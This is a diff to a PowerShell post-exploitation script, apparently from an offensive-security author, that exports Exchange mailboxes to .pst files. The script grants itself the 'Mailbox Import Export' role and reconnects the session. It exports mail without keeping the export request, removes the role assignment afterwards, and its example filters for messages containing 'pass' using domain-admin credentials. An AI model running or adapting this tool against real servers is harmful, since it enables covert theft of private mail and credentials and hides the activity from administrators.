@@ -6,34 +6,26 @@ function UsePSSessionToExportMailfromExchange
 This script will export the mail(.pst) from the Exchange server.
 First it will use PSSession to connect the Exchange server.
 Then it'll check the user's privilege.
-If the user is not in the "Mailbox Import Export",the script will add the user to it.
+If the user is not in the "Mailbox Import Export",the script will add the user to it and reconnect the Exchange server.
 Next it will export the mail and save it.
 At last it will remove the user from the group and remove the PSSession.
-
 Author: 3gstudent
-
 .PARAMETER User
 The user to use.
 In general, you can choose the account in the domain admins.
-
 .PARAMETER Password
 The password of the user.
-
 .PARAMETER MailBox
 The mail you want to export.
-
 .PARAMETER ExportPath
 The export path of the mail.
-
 .PARAMETER ConnectionUri
 The uri of the Exchange server.
 Eg.
     http://Exchange01.test.com/PowerShell/
     
 .PARAMETER $Filter
-
 The search filter of the mail.
-
 .EXAMPLE
 PS C:\> UsePSSessionToExportMailfromExchange -User "administrator" -Password "DomainAdmin123!" -MailBox "test1" -ExportPath "\\Exchange01.test.com\c$\test\" -ConnectionUri "http://Exchange01.test.com/PowerShell/" -Filter "{`"(body -like `"*pass*`")`"}"
 #>
@@ -69,6 +61,11 @@ PS C:\> UsePSSessionToExportMailfromExchange -User "administrator" -Password "Do
     	Write-Host "[+] Start to add user" 
     	#Add user
     	New-ManagementRoleAssignment –Role "Mailbox Import Export" –User $User| Out-Null
+    	Write-Host "[>] Start to reconnect"
+    	#Reconnect
+    	Remove-PSSession $Session
+    	$Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri $ConnectionUri -Authentication Kerberos -Credential $Credential
+    	Import-PSSession $Session -AllowClobber| Out-Null
     }
     Write-Host "[+] Start to export mail" 
     #Export mail and do not save the export request
